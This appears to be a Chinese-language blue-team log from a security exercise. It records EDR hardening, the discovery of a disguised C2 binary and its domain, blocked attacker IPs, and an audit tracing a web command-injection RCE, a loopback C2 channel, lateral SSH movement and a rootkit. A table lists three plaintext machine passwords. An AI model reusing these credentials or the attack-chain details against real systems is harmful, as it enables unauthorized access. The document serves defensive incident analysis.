- 移除 `/tmp/` 从 securitySensitivePaths
- WEB-001 保留 inotify write 拦截（不影响读）
- 策略从 143→133→135 条

### 11:00~12:00 — EDR 目录保护

**问题**: 攻击者 root shell 可直接删 `/opt/edr/` 和 `/etc/edr/`，重启后 EDR 不可用。

**修复**:
1. `fanotify.go` — `isCriticalProcessForPath` 中 `/opt/edr/` 和 `/etc/edr/` 检查移到 bash/ssh 等关键进程之前，仅允许 edr-agent/edrctl 访问
2. 策略新增 SELF001b(/opt/edr/ block+fanotify_deny) + SELF001c(/etc/edr/ block+fanotify_deny)
3. agent 配置 — 网关/target file_watch 添加 `/opt/edr/` `/etc/edr/`

**验证**: 网关 `echo test > /opt/edr/_test` → `Operation not permitted` ✅

**已知副作用**: bash 不能读 `/etc/edr/policy.json`（监控需先停 EDR）

### 12:00~14:00 — sshd 僵死根因最终确认

**排除假说**: fanotify 未拦截 sshd（0条 deny 事件）

**真因**: 双 EDR 进程 + 19 BPF 探针 + fanotify 路径策略评估 → 系统调用开销堆积 → sshd banner exchange 超时。单进程后待验证。

**临时方案**: 云控制台重启 → 立即杀冗余 EDR 进程 → 保留单进程。

### 审计中心监控

部署 `/root/edr_audit.sh`（全局巡检）和 `/root/edr_monitor_all.sh`（三机实时面板）到网关，支持一键查看规则命中、最新响应、IPS攻击。

### 密码变更记录

| 时间 | 机器 | 密码 |
|------|------|------|
| 初版 | 全部 | <REDACTED_DEFAULT_PASSWORD> |
| 06-22 | 网关 | <REDACTED_PASSWORD_VARIANT_1> |
| 06-22 | 网关 | <REDACTED_PASSWORD_VARIANT_2> |
| 06-22 | 网关 | hG#?=A,CUkV#cDk8rS\|XY% |
| 06-22 | 目标机 | Y4.W+":uUcu7=c-n7x4\|4$ |
| 06-22 | 内网机 | 7nu.>ST@Jje3sGTjjGPXSh |

### 封禁 IP 累计

10 个 IP (<RED_TEAM_IP>, <EXT_IP_1>, <EXT_IP_2>, <EXT_IP_3>, <EXT_IP_4>, <EXT_IP_5>, <EXT_IP_6>, <EXT_IP_7> 等)


---

## 06-23 14:30~15:00 — 恶意进程发现与处置

### 1. kworker 伪装进程 ddbf_c2 发现

在目标机 kworker 进程中，发现伪装成内核线程的可疑进程 `ddbf_c2`。

**攻击 C2 域名**: `doh.rjay9.top`

**溯源**: 通过站长之家反查域名，获取公网 IP: **<C2_SERVER_IP>**

**处置**: 
- 网关三链封禁 `<C2_SERVER_IP>`（INPUT + FORWARD + OUTPUT + conntrack 清连接）
- 该 IP 已加入封禁清单（第 11 个封禁 IP）

### 2. 恶意样本采集

将目标机 `/opt/` 下的二进制文件 `ddbf_c2` 导出到本地，作为恶意样本留存分析。

**样本特征**: 
- 路径: `/opt/ddbf_c2`
- 伪装: 命名仿内核线程 kworker 风格
- C2: `doh.rjay9.top` → `<C2_SERVER_IP>`
- 通信: 疑似 DNS-over-HTTPS (DoH) 隧道

### 3. 内核致命错误修复

目标机出现内核致命错误（Kernel Panic / Oops），执行了内核模块重新下载与加载修复。

### 4. 网络拓扑加固

修改网络拓扑，限制目标机 (<TARGET_IP>) 与审计中心 (<AUDIT_IP>) 的外网直连能力：

```
变更前: 目标机/审计中心 → 网关 → 外网 (可直连)
变更后: 目标机/审计中心 → 仅内网通信, 外网仅经网关严格转发
```

**目的**: 即使攻击者获取内网机器 root，也无法直接外连 C2 服务器，必须经过网关 IPS 检查。

---

## 06-23 封禁 IP 最终清单 (11个)

| IP | 原因 | 封禁时间 |
|----|------|------|
| <RED_TEAM_IP> | RCE主攻, root权限47分钟 | 06-22 11:22 |
| <EXT_IP_1> | diagnostic命令注入探测 | 06-22 11:50 |
| <EXT_IP_2> | C2服务器 | 06-22 14:00 |
| <EXT_IP_3> | diagnostic命令注入 | 06-22 16:37 |
| <EXT_IP_4> | 夜间扫描 | 06-23 09:00 |
| <EXT_IP_5> | 夜间扫描 | 06-23 09:00 |
| <EXT_IP_6> | 夜间扫描 | 06-23 09:00 |
| <EXT_IP_7> | 夜间扫描 | 06-23 09:00 |
| <SCANNER_IP_1> | SSH-2.0-Go探测 | 06-23 |
| <SCANNER_IP_2> | Zmap扫描 | 06-23 |
| **<C2_SERVER_IP>** | **ddbf_c2 C2 (doh.rjay9.top)** | 06-23 15:00 |

---

## 06-24 14:00~17:30 — 全网日志深度审计分析

**操作员**: 蓝队  
**目标**: 网关 (<GATEWAY_IP>) + Web业务机 (<TARGET_IP>) + 审计中心 (<AUDIT_IP>)  
**产出**: `/home/cheater/演习日志分析报告.md`

### 审计范围与方法

| 数据源 | 所在机器 | 分析内容 |
|--------|----------|----------|
| `/var/log/auth.log` | 网关 + Web机 + 审计中心 | SSH 登录/失败全量记录，红蓝操作区分 |
| `/var/log/suricata/eve.json` | 网关 | HTTP/DNS/TLS/Flow 全量事件（非仅告警），384MB |
| `/var/log/suricata/fast.log` | 网关 | Suricata IDS 告警摘要 |
| `/var/log/suricata/stats.log` | 网关 | 流量统计异常 |
| `/var/log/kern.log` | Web机 | 内核模块加载/污染/崩溃记录 |
| `/root/.bash_history` | 全部三机 | 人工操作审计 |
| `journalctl` | 全部三机 | systemd 服务启停记录（EDR agent/Supervisor） |
| `/var/lib/edr/events.jsonl` | 审计中心 | EDR 聚合事件链（94674条） |
| `strings /usr/lib/falco/falco-ext` | 网关 `/tmp/` 样本 | Rootkit 功能逆向 |
| `stat` + `find` | 全部三机 | 文件时间戳取证 |

### 核心发现

#### 1. 攻击入口确认：Web RCE，非 SSH
- `logistics/trace?host=` (8080) + `diagnostic/ping?host=` (9001) **两处命令注入**
- `<RED_TEAM_IP>` 于 10:32 完成 RCE，`id` 返回 `root`
- Suricata HTTP 流量事件 796 条完全覆盖攻击过程，非仅告警

#### 2. C2 隐蔽通道发现
- 攻击者通过 9001 diagnostic 跳板，部署本机 C2 `/tmp/ws.py` → `127.0.0.1:18888`
- 11:36 后全部操作经由 loopback 通信，Suricata **完全不抓取**
- 日志空窗期本质是攻击者成功建立了不可见的 C2 通道

#### 3. rootkit 加载确切时间
- `kern.log`: **Jun 22 17:16:20** `nf_conn_ext: loading out-of-tree module taints kernel`
- Rootkit 活跃期: Jun 22 17:16 → Jun 23 16:13 (reboot) ≈ **23小时**

#### 4. 横向移动确证
- 网关仅运行 SSH (port 22)，无业务服务，无法直接注入
- `<TARGET_IP> → <GATEWAY_IP>` Jun 22 13:18:48，会话仅 **0.14秒**（自动化 scp/ssh 单命令）
- 攻击者在网关 `/tmp` 投递 SSH 密钥，蓝队于 17:07 发现并删除

#### 5. 凭据泄露路径
- `suricata/eve.json` 记录：10:14:21 攻击者读取 `/opt/edgeops/lib/application-prod.yml`
- 该文件为演习设计者故意放置，含网关连接凭据 — 文件现已被覆盖

#### 6. 审计中心 187 佐证
- `auth.log` 零条外部 IP 成功登录 → 红队未触达
- `BLUE-TEAM-HANDOVER.md` 揭露
- EDR `events.jsonl` 仅覆盖 187，不监控 186/188，无攻击检测价值

### 关键时间线（本次审计确认）

| 时间 | 事件 | 来源 |
|------|------|------|
| Jun 22 09:08 | <RED_TEAM_IP> SSH 登录网关（蓝队操作） | 网关 auth.log |
| Jun 22 10:14 | 读取 application-prod.yml（获取网关凭据） | suricata/eve.json |
| Jun 22 10:32 | `logistics/trace` 命令注入 RCE → root | suricata/eve.json |
| Jun 22 11:11 | 部署本机 C2 /tmp/ws.py → 127.0.0.1:18888 | suricata/eve.json |
| Jun 22 11:36 | 183 最后一次 Suricata 可见请求 → C2 切换完成 | suricata/eve.json |
| Jun 22 13:18 | Web 机 → 网关自动化 SSH 横向移动 (0.14s) | 网关 auth.log |
| Jun 22 17:16 | 内核模块加载 → `kernel taint` 确证 | Web kern.log |
| Jun 23 15:46 | 蓝队隔离 falco-ext | 文件时间戳 |
| Jun 23 16:13 | reboot 清除内存态 rootkit + 重装内核模块 | Web bash_history |
| Jun 24 10:39 | falco-ext-chain.tar.gz 取证留存 | 文件时间戳 |

### 审计产出

- **正式报告**: `/home/cheater/演习日志分析报告.md`（九章, 约320行）
- **Red Team IP**: <RED_TEAM_IP> (主攻), <EXT_IP_8>, <EXT_IP_9> (C2), <EXT_IP_3>, <EXT_IP_10>
- **MITRE ATT&CK**: 覆盖 Initial Access / Execution / Persistence / Defense Evasion / Lateral Movement / C2 全链
- **Rootkit 逆向**: falco_ext ftrace 挂钩 + kworker 伪装 + printk 日志抑制
